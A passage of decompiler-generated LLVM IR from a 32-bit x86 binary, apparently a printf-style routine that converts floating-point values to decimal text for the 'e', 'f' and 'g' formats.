  %v8_8054d95 = icmp slt i8 %v7_8054d95, 0
  %v9_8054d95 = icmp eq i8 %v4_8054d95, 0
  %v10_8054d95 = icmp slt i8 %v4_8054d95, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8054daa = icmp eq i1 %v10_8054d95, %v8_8054d95
  %v4_8054daa = icmp eq i1 %v9_8054d95, false
  %v5_8054daa = and i1 %v4_8054daa, %v3_8054daa
  br i1 %v5_8054daa, label %dec_label_pc_8054db1, label %dec_label_pc_8054dac

dec_label_pc_8054dac:                             ; preds = %dec_label_pc_8054d87
  br label %dec_label_pc_8054db1

dec_label_pc_8054db1:                             ; preds = %dec_label_pc_8054d87, %dec_label_pc_8054dac
  %v2_8054db9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8054db9, i32* @ecx, align 4
  br label %dec_label_pc_8055182

dec_label_pc_8054dc2:                             ; preds = %dec_label_pc_8054d3a, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_8054ddc = xor i3 %v4_8054cac, -4
  store i3 %v3_8054ddc, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8054de2

dec_label_pc_8054de2:                             ; preds = %dec_label_pc_8054e33, %dec_label_pc_8054dc2
  %v0_8054e33 = phi i32 [ 4096, %dec_label_pc_8054dc2 ], [ %v2_8054e33, %dec_label_pc_8054e33 ]
  %v2_8054de5 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8054dc2 ], [ %v2_8054de581, %dec_label_pc_8054e33 ]
  %v1_8054e1d = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8054dc2 ], [ %v0_8054de279, %dec_label_pc_8054e33 ]
  %v0_8054e2f66 = phi i32 [ 13, %dec_label_pc_8054dc2 ], [ %v1_8054de4, %dec_label_pc_8054e33 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8054dc2 ], [ %stack_var_-220.1, %dec_label_pc_8054e33 ]
  %v1_8054de4 = add i32 %v0_8054e2f66, -1
  %v4_8054de5 = fcmp ule x86_fp80 %v1_8054e1d, %v2_8054de5
  br i1 %v4_8054de5, label %dec_label_pc_8054e0c, label %dec_label_pc_8054de9

dec_label_pc_8054de9:                             ; preds = %dec_label_pc_8054de2
  store x86_fp80 %v1_8054e1d, x86_fp80* %st0.global-to-local, align 4
  %v3_8054deb = mul i32 %v1_8054de4, 12
  store i32 %v3_8054deb, i32* %eax.global-to-local, align 4
  %v1_8054dee = add i32 %v3_8054deb, ptrtoint (x86_fp80** @global_var_805cdc0.290 to i32)
  %v2_8054dee = inttoptr i32 %v1_8054dee to x86_fp80*
  %v3_8054dee = load x86_fp80, x86_fp80* %v2_8054dee, align 4
  %v4_8054df4 = fmul x86_fp80 %v1_8054e1d, %v3_8054dee
  store x86_fp80 %v4_8054df4, x86_fp80* %st1.global-to-local, align 4
  %v4_8054df8 = fcmp ule x86_fp80 %v4_8054df4, %v3_8054dee
  br i1 %v4_8054df8, label %dec_label_pc_8054e2d, label %dec_label_pc_8054dfc

dec_label_pc_8054dfc:                             ; preds = %dec_label_pc_8054de9
  store x86_fp80 %v4_8054df4, x86_fp80* %st1.global-to-local, align 4
  %v5_8054e06 = sub i32 %stack_var_-220.0, %v0_8054e33
  br label %dec_label_pc_8054e2f

dec_label_pc_8054e0c:                             ; preds = %dec_label_pc_8054de2
  %v3_8054e0c = mul i32 %v1_8054de4, 12
  store i32 %v3_8054e0c, i32* %eax.global-to-local, align 4
  %v1_8054e0f = add i32 %v3_8054e0c, ptrtoint (x86_fp80** @global_var_805cdc0.290 to i32)
  %v2_8054e0f = inttoptr i32 %v1_8054e0f to x86_fp80*
  %v3_8054e0f = load x86_fp80, x86_fp80* %v2_8054e0f, align 4
  %v4_8054e15 = fdiv x86_fp80 %v3_8054e0f, %v1_8054e1d
  store x86_fp80 %v4_8054e15, x86_fp80* %st1.global-to-local, align 4
  %v4_8054e17 = fcmp ogt x86_fp80 %v3_8054e0f, %v1_8054e1d
  br i1 %v4_8054e17, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_8054e0c
  store x86_fp80 %v3_8054e0f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054e1d

bb183:                                            ; preds = %dec_label_pc_8054e0c
  %v5_8054e17 = fcmp olt x86_fp80 %v3_8054e0f, %v1_8054e1d
  br i1 %v5_8054e17, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_8054e0f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054e2d

bb184:                                            ; preds = %bb183
  %not.v6_8054e17 = fcmp une x86_fp80 %v3_8054e0f, %v1_8054e1d
  store x86_fp80 %v3_8054e0f, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_8054e17, label %dec_label_pc_8054e2d, label %dec_label_pc_8054e1d

dec_label_pc_8054e1d:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_8054e0f, x86_fp80* %st1.global-to-local, align 4
  %v5_8054e27 = add i32 %stack_var_-220.0, %v0_8054e33
  br label %dec_label_pc_8054e2f

dec_label_pc_8054e2d:                             ; preds = %dec_label_pc_8054de9, %.thread51, %bb184
  %v1_8054e2d = phi x86_fp80 [ %v1_8054e1d, %.thread51 ], [ %v1_8054e1d, %bb184 ], [ %v3_8054dee, %dec_label_pc_8054de9 ]
  %v0_8054de280 = phi x86_fp80 [ %v3_8054e0f, %.thread51 ], [ %v3_8054e0f, %bb184 ], [ %v4_8054df4, %dec_label_pc_8054de9 ]
  store x86_fp80 %v1_8054e2d, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054e2f

dec_label_pc_8054e2f:                             ; preds = %dec_label_pc_8054e1d, %dec_label_pc_8054dfc, %dec_label_pc_8054e2d
  %v2_8054de581 = phi x86_fp80 [ %v1_8054e2d, %dec_label_pc_8054e2d ], [ %v2_8054de5, %dec_label_pc_8054e1d ], [ %v1_8054e1d, %dec_label_pc_8054dfc ]
  %v0_8054de279 = phi x86_fp80 [ %v0_8054de280, %dec_label_pc_8054e2d ], [ %v3_8054e0f, %dec_label_pc_8054e1d ], [ %v4_8054df4, %dec_label_pc_8054dfc ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8054e2d ], [ %v5_8054e27, %dec_label_pc_8054e1d ], [ %v5_8054e06, %dec_label_pc_8054dfc ]
  %v1_8054e2f = icmp eq i32 %v1_8054de4, 0
  br i1 %v1_8054e2f, label %.thread60, label %dec_label_pc_8054e33

dec_label_pc_8054e33:                             ; preds = %dec_label_pc_8054e2f
  %v2_8054e33 = sdiv i32 %v0_8054e33, 2
  store i32 %v2_8054e33, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054de2

.thread60:                                        ; preds = %dec_label_pc_8054e2f
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054e57

dec_label_pc_8054e57:                             ; preds = %dec_label_pc_8054d3a, %.thread60
  %v0_8054f11 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8054d3a ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8054d3a ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8054e5b = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8054d32, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8054e6e = and i32 %v2_8054e5b, -65536
  %v1_8054e73 = udiv i16 %tmp146, 256
  %v2_8054e73 = zext i16 %v1_8054e73 to i32
  %v3_8054e73 = or i32 %v2_8054e73, 12
  %v10_8054e73 = mul nuw nsw i32 %v3_8054e73, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8054e6e.masked = zext i16 %tmp194 to i32
  %v11_8054e73 = or i32 %v10_8054e73, %v4_8054e6e.masked
  %v12_8054e73 = or i32 %v11_8054e73, %v6_8054e6e
  store i32 %v12_8054e73, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054e7b

dec_label_pc_8054e7b:                             ; preds = %dec_label_pc_8054ecd.dec_label_pc_8054e7b_crit_edge, %dec_label_pc_8054e57
  %v2_8054ea0 = phi x86_fp80 [ %storemerge, %dec_label_pc_8054e57 ], [ %v2_8054ea0.pre, %dec_label_pc_8054ecd.dec_label_pc_8054e7b_crit_edge ]
  %v1_8054e7b = phi i3 [ %v1_8054d32, %dec_label_pc_8054e57 ], [ %v1_8054e7b.pre, %dec_label_pc_8054ecd.dec_label_pc_8054e7b_crit_edge ]
  %v3_8054ea2 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8054e57 ], [ %v0_8054e7b.pre, %dec_label_pc_8054ecd.dec_label_pc_8054e7b_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8054e5b, %dec_label_pc_8054e57 ], [ %v4_8054e9b, %dec_label_pc_8054ecd.dec_label_pc_8054e7b_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_8054ea2 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8054e95 = sitofp i32 %tmp195 to x86_fp80
  %v4_8054e9b = add i32 %stack_var_-212.0, 9
  %v4_8054ea0 = fsub x86_fp80 %v2_8054ea0, %v5_8054e95
  store i3 %v1_8054e7b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054ea2 = fmul x86_fp80 %v3_8054ea2, %v4_8054ea0
  store x86_fp80 %v4_8054ea2, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054ea4

dec_label_pc_8054ea4:                             ; preds = %dec_label_pc_8054ea4.dec_label_pc_8054ea4_crit_edge, %dec_label_pc_8054e7b
  %v0_8054eb8 = phi i32 [ %v0_8054eb8.pre, %dec_label_pc_8054ea4.dec_label_pc_8054ea4_crit_edge ], [ %tmp195, %dec_label_pc_8054e7b ]
  %v0_8054ea8 = phi i32 [ %v0_8054ea8.pre, %dec_label_pc_8054ea4.dec_label_pc_8054ea4_crit_edge ], [ 0, %dec_label_pc_8054e7b ]
  %v1_8054ea8 = add i32 %v0_8054ea8, 1
  store i32 %v1_8054ea8, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8054eb2 = sub i32 %v4_8054e9b, %v1_8054ea8
  %div = udiv i32 %v0_8054eb8, 10
  %tmp185 = urem i32 %v0_8054eb8, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8054ebe = and i32 %div, 536870656
  store i32 %v2_8054eb2, i32* %edx.global-to-local, align 4
  %v1_8054ec4 = trunc i32 %tmp185 to i8
  %v2_8054ec4 = or i8 %v1_8054ec4, 48
  %v12_8054ec4 = zext i8 %v2_8054ec4 to i32
  %v15_8054ec4 = or i32 %v12_8054ec4, %v3_8054ebe
  store i32 %v15_8054ec4, i32* %eax.global-to-local, align 4
  %v3_8054ec9 = inttoptr i32 %v2_8054eb2 to i8*
  store i8 %v2_8054ec4, i8* %v3_8054ec9, align 1
  %v7_8054ecb = icmp sgt i32 %v1_8054ea8, 8
  br i1 %v7_8054ecb, label %dec_label_pc_8054ecd, label %dec_label_pc_8054ea4.dec_label_pc_8054ea4_crit_edge

dec_label_pc_8054ea4.dec_label_pc_8054ea4_crit_edge: ; preds = %dec_label_pc_8054ea4
  %v0_8054ea8.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8054eb8.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054ea4

dec_label_pc_8054ecd:                             ; preds = %dec_label_pc_8054ea4
  %v0_8054ecd = load i32, i32* @edi, align 4
  %v1_8054ecd = add i32 %v0_8054ecd, 1
  store i32 %v1_8054ecd, i32* @edi, align 4
  %v7_8054ed1 = icmp sgt i32 %v1_8054ecd, 2
  br i1 %v7_8054ed1, label %dec_label_pc_8054ed3, label %dec_label_pc_8054ecd.dec_label_pc_8054e7b_crit_edge

dec_label_pc_8054ecd.dec_label_pc_8054e7b_crit_edge: ; preds = %dec_label_pc_8054ecd
  %v0_8054e7b.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8054e7b.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8054ea0.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054e7b

dec_label_pc_8054ed3:                             ; preds = %dec_label_pc_8054ecd
  %v0_8054ed3 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054ed3 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8054ed3, x86_fp80* %st0.global-to-local, align 4
  %v2_8054ed5 = add i3 %v0_8054ed3, 2
  store i3 %v2_8054ed5, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054ed7 = add i8 %stack_var_-207.0, -96
  %v6_8054ed7 = sub i8 95, %stack_var_-207.0
  %v7_8054ed7 = and i8 %v6_8054ed7, %stack_var_-207.0
  %v8_8054ed7 = icmp slt i8 %v7_8054ed7, 0
  %v9_8054ed7 = icmp eq i8 %v4_8054ed7, 0
  %v10_8054ed7 = icmp slt i8 %v4_8054ed7, 0
  %v3_8054edc = icmp eq i1 %v10_8054ed7, %v8_8054ed7
  %v4_8054edc = icmp eq i1 %v9_8054ed7, false
  %v5_8054edc = and i1 %v4_8054edc, %v3_8054edc
  br i1 %v5_8054edc, label %dec_label_pc_8054eeb, label %dec_label_pc_8054ede

dec_label_pc_8054ede:                             ; preds = %dec_label_pc_8054ed3
  %v4_8054ede = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8054eeb

dec_label_pc_8054eeb:                             ; preds = %dec_label_pc_8054ed3, %dec_label_pc_8054ede
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8054ed3 ], [ %v4_8054ede, %dec_label_pc_8054ede ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8054ed3 ], [ 69, %dec_label_pc_8054ede ]
  %v12_8054eeb = icmp eq i8 %stack_var_-207.1, 103
  %v1_8054ef0 = icmp eq i1 %v12_8054eeb, false
  br i1 %v1_8054ef0, label %dec_label_pc_8054ef9, label %dec_label_pc_8054ef2

dec_label_pc_8054ef2:                             ; preds = %dec_label_pc_8054eeb
  %v0_8054ef2 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_8054ef2, 1
  br i1 %tmp186, label %dec_label_pc_8054f00, label %dec_label_pc_8054ef6

dec_label_pc_8054ef6:                             ; preds = %dec_label_pc_8054ef2
  %v1_8054ef6 = add i32 %v0_8054ef2, -1
  store i32 %v1_8054ef6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054f00

dec_label_pc_8054ef9:                             ; preds = %dec_label_pc_8054eeb
  %v12_8054ef9 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_8054ef9, label %dec_label_pc_8054f04, label %dec_label_pc_8054ef9.dec_label_pc_8054f00_crit_edge

dec_label_pc_8054ef9.dec_label_pc_8054f00_crit_edge: ; preds = %dec_label_pc_8054ef9
  %v0_8054f00.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054f00

dec_label_pc_8054f00:                             ; preds = %dec_label_pc_8054ef9.dec_label_pc_8054f00_crit_edge, %dec_label_pc_8054ef2, %dec_label_pc_8054ef6
  %v0_8054f00 = phi i32 [ %v0_8054f00.pre, %dec_label_pc_8054ef9.dec_label_pc_8054f00_crit_edge ], [ %v0_8054ef2, %dec_label_pc_8054ef2 ], [ %v1_8054ef6, %dec_label_pc_8054ef6 ]
  store i32 %v0_8054f00, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f31

dec_label_pc_8054f04:                             ; preds = %dec_label_pc_8054ef9
  store i32 %v0_8054f11, i32* %eax.global-to-local, align 4
  %v0_8054f08 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054f08 = add i32 %v0_8054f08, %v0_8054f11
  store i32 %v2_8054f08, i32* %ebx.global-to-local, align 4
  %v5_8054f0f = icmp slt i32 %v2_8054f08, -1
  br i1 %v5_8054f0f, label %dec_label_pc_8054f11, label %dec_label_pc_8054f31

dec_label_pc_8054f11:                             ; preds = %dec_label_pc_8054f04
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054f19 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8054f19, i32* %eax.global-to-local, align 4
  %v4_8054f21 = bitcast i32* %stack_var_-72 to i8*
  %v5_8054f21 = call i32 @__GI_memset(i8* %v4_8054f21, i32 48, i32 21)
  store i32 %v5_8054f21, i32* %eax.global-to-local, align 4
  %v0_8054f31.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f31

dec_label_pc_8054f31:                             ; preds = %dec_label_pc_8054f04, %dec_label_pc_8054f11, %dec_label_pc_8054f00
  %v1_8054f51 = phi i32 [ %v0_8054f00, %dec_label_pc_8054f00 ], [ %v2_8054f08, %dec_label_pc_8054f04 ], [ %v0_8054f31.pr.pre, %dec_label_pc_8054f11 ]
  %stack_var_-220.3 = phi i32 [ %v0_8054f11, %dec_label_pc_8054f00 ], [ %v0_8054f11, %dec_label_pc_8054f04 ], [ -1, %dec_label_pc_8054f11 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8054f44 = icmp sgt i32 %v1_8054f51, 20
  br i1 %v7_8054f44, label %dec_label_pc_8054f46, label %dec_label_pc_8054f51

dec_label_pc_8054f46:                             ; preds = %dec_label_pc_8054f31
  %v2_8054f46 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8054f46, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054f65.preheader

dec_label_pc_8054f51:                             ; preds = %dec_label_pc_8054f31
  %v0_8054f51 = load i32, i32* @esp, align 4
  %v2_8054f51 = add i32 %v1_8054f51, 165
  %v3_8054f51 = add i32 %v2_8054f51, %v0_8054f51
  store i32 %v3_8054f51, i32* %eax.global-to-local, align 4
  %v1_8054f58 = add i32 %v3_8054f51, 2
  %v2_8054f58 = inttoptr i32 %v1_8054f58 to i8*
  %v3_8054f58 = load i8, i8* %v2_8054f58, align 1
  %v4_8054f58 = add i8 %v3_8054f58, -53
  %v9_8054f58 = sub i8 52, %v3_8054f58
  %v10_8054f58 = and i8 %v9_8054f58, %v3_8054f58
  %v11_8054f58 = icmp slt i8 %v10_8054f58, 0
  %v13_8054f58 = icmp slt i8 %v4_8054f58, 0
  store i32 %v1_8054f58, i32* %ecx.global-to-local, align 4
  %v2_8054f5f = icmp eq i1 %v13_8054f58, %v11_8054f58
  %v3_8054f5f = zext i1 %v2_8054f5f to i32
  br label %dec_label_pc_8054f65.preheader

dec_label_pc_8054f65.preheader:                   ; preds = %dec_label_pc_8054f51, %dec_label_pc_8054f46
  %v0_8054f65102 = phi i32 [ %v1_8054f58, %dec_label_pc_8054f51 ], [ %v2_8054f46, %dec_label_pc_8054f46 ]
  %storemerge71 = phi i32 [ %v3_8054f5f, %dec_label_pc_8054f51 ], [ 0, %dec_label_pc_8054f46 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054f65

dec_label_pc_8054f65:                             ; preds = %dec_label_pc_8054f65.backedge, %dec_label_pc_8054f65.preheader
  %v3_8054f66 = phi i32 [ %v3_8054f66.pre, %dec_label_pc_8054f65.backedge ], [ %storemerge71, %dec_label_pc_8054f65.preheader ]
  %v0_8054f65 = phi i32 [ %v0_8054f68, %dec_label_pc_8054f65.backedge ], [ %v0_8054f65102, %dec_label_pc_8054f65.preheader ]
  %v1_8054f65 = add i32 %v0_8054f65, -1
  store i32 %v1_8054f65, i32* %ecx.global-to-local, align 4
  %v1_8054f66 = inttoptr i32 %v1_8054f65 to i8*
  %v2_8054f66 = load i8, i8* %v1_8054f66, align 1
  %v4_8054f66 = trunc i32 %v3_8054f66 to i8
  %v5_8054f66 = add i8 %v2_8054f66, %v4_8054f66
  store i8 %v5_8054f66, i8* %v1_8054f66, align 1
  %v0_8054f68 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054f68 = inttoptr i32 %v0_8054f68 to i8*
  %v2_8054f68 = load i8, i8* %v1_8054f68, align 1
  %v3_8054f68 = zext i8 %v2_8054f68 to i32
  %v4_8054f68 = load i32, i32* %edx.global-to-local, align 4
  %v5_8054f68 = and i32 %v4_8054f68, -256
  %v6_8054f68 = or i32 %v5_8054f68, %v3_8054f68
  store i32 %v6_8054f68, i32* %edx.global-to-local, align 4
  %v7_8054f6a = icmp eq i8 %v2_8054f68, 48
  br i1 %v7_8054f6a, label %dec_label_pc_8054f65.backedge, label %dec_label_pc_8054f6f

dec_label_pc_8054f65.backedge:                    ; preds = %dec_label_pc_8054f65, %dec_label_pc_8054f6f
  %v3_8054f66.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054f65

dec_label_pc_8054f6f:                             ; preds = %dec_label_pc_8054f65
  %v2_8054f6f = add i8 %v2_8054f68, -57
  %v7_8054f6f = sub i8 56, %v2_8054f68
  %v8_8054f6f = and i8 %v7_8054f6f, %v2_8054f68
  %v9_8054f6f = icmp slt i8 %v8_8054f6f, 0
  %v10_8054f6f = icmp eq i8 %v2_8054f6f, 0
  %v11_8054f6f = icmp slt i8 %v2_8054f6f, 0
  %v3_8054f72 = icmp eq i1 %v11_8054f6f, %v9_8054f6f
  %v4_8054f72 = icmp eq i1 %v10_8054f6f, false
  %v5_8054f72 = and i1 %v4_8054f72, %v3_8054f72
  br i1 %v5_8054f72, label %dec_label_pc_8054f65.backedge, label %dec_label_pc_8054f74

dec_label_pc_8054f74:                             ; preds = %dec_label_pc_8054f6f
  %v2_8054f74 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8054f74, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8054f68, %v2_8054f74
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8054f7f, label %dec_label_pc_8054f8c

dec_label_pc_8054f7f:                             ; preds = %dec_label_pc_8054f74
  store i32 %v2_8054e5b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054f95

dec_label_pc_8054f8c:                             ; preds = %dec_label_pc_8054f74
  store i32 %v2_8054f74, i32* %edx.global-to-local, align 4
  store i32 %v2_8054f74, i32* %ecx.global-to-local, align 4
  %v1_8054f94 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8054f94, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054f95

dec_label_pc_8054f95:                             ; preds = %dec_label_pc_8054f7f, %dec_label_pc_8054f8c
  %v0_8054f95 = phi i32 [ %v0_8054f68, %dec_label_pc_8054f7f ], [ %v2_8054f74, %dec_label_pc_8054f8c ]
  %v1_8054f95 = add i32 %v0_8054f95, 1
  store i32 %v1_8054f95, i32* %eax.global-to-local, align 4
  %v2_8054f9c = inttoptr i32 %v1_8054f95 to i8*
  store i8 0, i8* %v2_8054f9c, align 1
  br i1 %v1_8054ef0, label %dec_label_pc_8054fc2, label %dec_label_pc_8054fa7

dec_label_pc_8054fa7:                             ; preds = %dec_label_pc_8054f95
  %v0_8054fa7 = load i32, i32* %esi.global-to-local, align 4
  %v5_8054faa = icmp slt i32 %v0_8054fa7, -4
  br i1 %v5_8054faa, label %dec_label_pc_8054fcf, label %dec_label_pc_8054fac

dec_label_pc_8054fac:                             ; preds = %dec_label_pc_8054fa7
  %v1_8054fac = load i32, i32* %ebx.global-to-local, align 4
  %v7_8054fae = icmp slt i32 %v1_8054fac, %v0_8054fa7
  br i1 %v7_8054fae, label %dec_label_pc_8054fcf, label %dec_label_pc_8054fb7

dec_label_pc_8054fb7:                             ; preds = %dec_label_pc_8054fac
  %v2_8054fb9 = sub i32 %v1_8054fac, %v0_8054fa7
  store i32 %v2_8054fb9, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054fd3

dec_label_pc_8054fc2:                             ; preds = %dec_label_pc_8054f95
  %v4_8054fc2 = zext i8 %stack_var_-207.1 to i32
  %v5_8054fc2 = load i32, i32* %ebx.global-to-local, align 4
  %v6_8054fc2 = and i32 %v5_8054fc2, -256
  %v7_8054fc2 = or i32 %v6_8054fc2, %v4_8054fc2
  store i32 %v7_8054fc2, i32* %ebx.global-to-local, align 4
  %v10_8054fc6 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8054fc6, label %dec_label_pc_8054fc2.dec_label_pc_8054fd3_crit_edge, label %dec_label_pc_8054fcf

dec_label_pc_8054fc2.dec_label_pc_8054fd3_crit_edge: ; preds = %dec_label_pc_8054fc2
  %v0_8054fd3.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054fd3

dec_label_pc_8054fcf:                             ; preds = %dec_label_pc_8054fa7, %dec_label_pc_8054fac, %dec_label_pc_8054fc2
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8054fc2 ], [ 103, %dec_label_pc_8054fac ], [ 103, %dec_label_pc_8054fa7 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054fdd

dec_label_pc_8054fd3:                             ; preds = %dec_label_pc_8054fc2.dec_label_pc_8054fd3_crit_edge, %dec_label_pc_8054fb7
  %v0_8054fd5 = phi i32 [ %v0_8054fd3.pre, %dec_label_pc_8054fc2.dec_label_pc_8054fd3_crit_edge ], [ %v0_8054fa7, %dec_label_pc_8054fb7 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8054fc2.dec_label_pc_8054fd3_crit_edge ], [ 102, %dec_label_pc_8054fb7 ]
  %v2_8054fd3 = icmp slt i32 %v0_8054fd5, 0
  store i32 %v0_8054fd5, i32* %ebx.global-to-local, align 4
  %v1_8054fd7 = icmp eq i1 %v2_8054fd3, false
  br i1 %v1_8054fd7, label %dec_label_pc_8054fdd, label %dec_label_pc_8054fd9

dec_label_pc_8054fd9:                             ; preds = %dec_label_pc_8054fd3
  %v0_8054fd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054fd9 = add i32 %v0_8054fd9, -1
  store i32 %v1_8054fd9, i32* %edx.global-to-local, align 4
  %v1_8054fda = inttoptr i32 %v1_8054fd9 to i8*
  store i8 48, i8* %v1_8054fda, align 1
  %v0_8055012.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054fdd

dec_label_pc_8054fdd:                             ; preds = %dec_label_pc_8054fd3, %dec_label_pc_8054fcf, %dec_label_pc_8054fd9
  %v1_805506d = phi i32 [ %v0_8054fd5, %dec_label_pc_8054fd3 ], [ %v0_8055012.pre, %dec_label_pc_8054fd9 ], [ 0, %dec_label_pc_8054fcf ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8054fd3 ], [ %stack_var_-197.1, %dec_label_pc_8054fd9 ], [ %stack_var_-197.0, %dec_label_pc_8054fcf ]
  %v2_8054fdd = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8054fdd, i32* %eax.global-to-local, align 4
  %v0_8054fec = load i32, i32* %edx.global-to-local, align 4
  %v1_8054fec = add i32 %v0_8054fec, 1
  store i32 %v1_8054fec, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8054ffb = inttoptr i32 %v0_8054fec to i8*
  %v2_8054ffb = load i8, i8* %v1_8054ffb, align 1
  %v3_8054ffb = zext i8 %v2_8054ffb to i32
  %v5_8054ffb = and i32 %v2_8054fdd, -256
  %v6_8054ffb = or i32 %v3_8054ffb, %v5_8054ffb
  store i32 %v6_8054ffb, i32* %eax.global-to-local, align 4
  store i32 %v6_8054ffb, i32* %stack_var_-22, align 4
  %v2_8055010 = sub i32 %v1_8054f95, %v1_8054fec
  store i32 %v2_8055010, i32* %edx.global-to-local, align 4
  %v1_8055012 = icmp eq i32 %v1_805506d, 0
  %v2_8055012 = icmp slt i32 %v1_805506d, 0
  br i1 %v2_8055012, label %dec_label_pc_8055061, label %dec_label_pc_8055016

dec_label_pc_8055016:                             ; preds = %dec_label_pc_8054fdd
  %v2_8055016 = sub i32 %v1_805506d, %v2_8055010
  %v8_8055016 = xor i32 %v2_8055010, %v1_805506d
  %v9_8055016 = xor i32 %v2_8055016, %v1_805506d
  %v10_8055016 = and i32 %v9_8055016, %v8_8055016
  %v11_8055016 = icmp slt i32 %v10_8055016, 0
  %v13_8055016 = icmp slt i32 %v2_8055016, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8055024 = icmp eq i1 %v13_8055016, %v11_8055016
  br i1 %v2_8055024, label %dec_label_pc_8055026, label %dec_label_pc_805505a

dec_label_pc_8055026:                             ; preds = %dec_label_pc_8055016
  store i32 %v2_8055016, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_8055016, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_805503b, label %dec_label_pc_8055056

dec_label_pc_805503b:                             ; preds = %dec_label_pc_8055026
